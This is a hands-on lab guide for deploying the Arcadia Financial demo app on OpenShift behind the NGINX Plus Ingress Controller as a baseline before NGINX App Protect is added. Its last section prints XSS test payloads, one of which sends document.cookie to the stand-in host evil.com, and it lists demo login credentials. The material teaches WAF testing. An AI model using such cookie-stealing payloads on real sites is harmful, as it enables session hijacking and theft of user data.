== Access Arcadia App without NGINX App Protect to establish a baseline

== Cleanup Process

Upon the completion of Lab Module 1, it's necessary to tidy up the lab
environment. Please follow the steps mentioned below.

Execute the following commands in the bash terminal:

[source,sh,role=execute]
----
oc delete virtualserver arcadia
oc delete -f arcadia.yml 
----


== Deploy the Arcadia Application into Kubernetes

[NOTE]
.Note
====
The Arcadia Financial application is the same application we introduced
in Module 1, but a different version with enhanced features which will
be used for our security lab exercises.
====

Before we can access the Arcadia application, we need to deploy it into
our OpenShift cluster. To do this, we'll use a single manifest file
that contains the necessary resources, such as Kubernetes deployments
for the four Docker containers and Kubernetes services for the four
Docker containers.

To get the YAML file, we'll use the following command in our terminal
window:

[source,sh,role=execute]
----
wget https://raw.githubusercontent.com/ericzji/nginx-openshift-lab/main/docs/class1/module2/templates/arcadia-all.yaml
----

Once we have the YAML file, we can apply it to our Kubernetes cluster
with the following command:

[source,sh,role=execute]
----
oc apply -f ./arcadia-all.yaml
----

We can check that our Arcadia application is running by using the
following command in our terminal window:

[source,sh,role=execute]
----
oc get svc
----

This will show us the services running in our cluster, including those related to the Arcadia application.

[source,texinfo,subs="attributes"]
----
$ oc get svc
NAME         TYPE           CLUSTER-IP      EXTERNAL-IP                            PORT(S)        AGE
app2         NodePort       172.30.134.98   <none>                                 80:30362/TCP   3m13s
app3         NodePort       172.30.45.51    <none>                                 80:31662/TCP   3m13s
backend      NodePort       172.30.83.103   <none>                                 80:31584/TCP   3m13s
kubernetes   ClusterIP      172.30.0.1      <none>                                 443/TCP        3h41m
main         NodePort       172.30.25.227   <none>                                 80:30511/TCP   3m13s
openshift    ExternalName   <none>          kubernetes.default.svc.cluster.local   <none>         3h31m
----

== Export the NGINX Ingress Controller services

Interacting with the NGINX Ingress Controller is  easier if we expoort the service External IPs into system variables. 
This allows for templating to take place when we expose our applications.

[NOTE]
.Note
====
If you completed this step in Module 1, you can skip it here. You can `cat .bashrc` if you need to check it is still there.
====

Paste the below into the terminal and press enter:

[source,sh,role=execute]
----
echo -e "\nexport nginx_ingress=\"$(oc get svc my-nginx-ingress-controller -n nginx-ingress -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')\"\n" >> ~/.bashrc &&
echo -e "\nexport dashboard_nginx_ingress=\"$(oc get svc dashboard-nginx-ingress -n nginx-ingress -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')\"\n" >> ~/.bashrc && source ~/.bashrc
----

You can check the domain name with the `echo` command

[source,sh,role=execute]
----
 echo "$nginx_ingress/"
----



== Publish Arcadia app with NGINX Plus Ingress Controller

Now that we have our Arcadia application deployed in our OpenShift
cluster, we need to publish it using the NGINX Plus Ingress Controller.
We'll do this by re-creating the NGINX Ingress Controller with Basic
HTTP using the following command in our terminal window:

This creates a VirtualServer resource for our Arcadia
application, which includes the host for the NGINX Ingress Controller
and the upstreams for the different microservices. We can now access our
Arcadia application externally using the NGINX Ingress Controller URL,
which can be found by running the following command in our terminal
window:

[source,sh,role=execute]
----
cat << EOF | envsubst > arcadia-virtualserver.yml
apiVersion: k8s.nginx.org/v1
kind: VirtualServer
metadata:
  name: arcadia
spec:
  host: $nginx_ingress
  upstreams:
  - name: main
    service: main
    port: 80
  - name: app2
    service: app2
    port: 80
  - name: app3
    service: app3
    port: 80
  routes:
  - path: /
    action:
      pass: main
  - path: /api
    action:
      proxy:
        upstream: app2
  - path: /app3
    action:
      proxy:
        upstream: app3
EOF
----

Use the `cat` command to view the contents of the file and verify the `host` line matches your nginx_ingress external domain name

[source,sh,role=execute]
----
cat arcadia-virtualserver.yml
----

Next, apply the yaml config

[source,sh,role=execute]
----
oc apply -f arcadia-virtualserver.yml
----


We can know go to the URL and  access our Arcadia application by opening it in a web browser.
Some browsers may try to redirect to https, so if you get a `404` error make sure you are using http

[source,sh,role=execute]
----
 echo "http://$nginx_ingress/"
----

You can also check with a curl command, but won't be able to complete the login below.

[source,sh,role=execute]
----
curl -k http://$nginx_ingress
----

You should be presented with the Main page, click on Login and enter the
credentials as below.

[source,]
----
Username: matt
Password: ilovef5
----

When you click on Log me in, you should be presented with the Arcadia
application that consists of four microservices:

Congratulations!

You have now successfully deployed the application in the K8s cluster and
published it externally using the NGINX Plus Ingress controller.

== Is our application protected against Layer 7 attacks?

Before we can protect our Arcadia application with NGINX App Protect, we
need to check if it's currently vulnerable to Layer 7 attacks. We can do
this by executing a simple XSS attack, which is a well-known OWASP top
10 attack.

To perform the XSS attack, we can launch our browser and append `?a=<script>` to the end of the application URL. +
If the request is allowed, then our application is vulnerable to XSS attacks.

image:image11.png[image]

We can further test this by appending the following to the application URL, which will attempt to steal our document cookie.
If this request is  allowed, then a bad actor could potentially steal sensitive information from our application user. +

[source,sh,role=execute]
----
?item='><script>document.location='http://evil.com/steal'+document.cookie</script>
----

Since our application is currently vulnerable to Layer 7 attacks, we'll
need to protect it using NGINX App Protect in the following Lab.
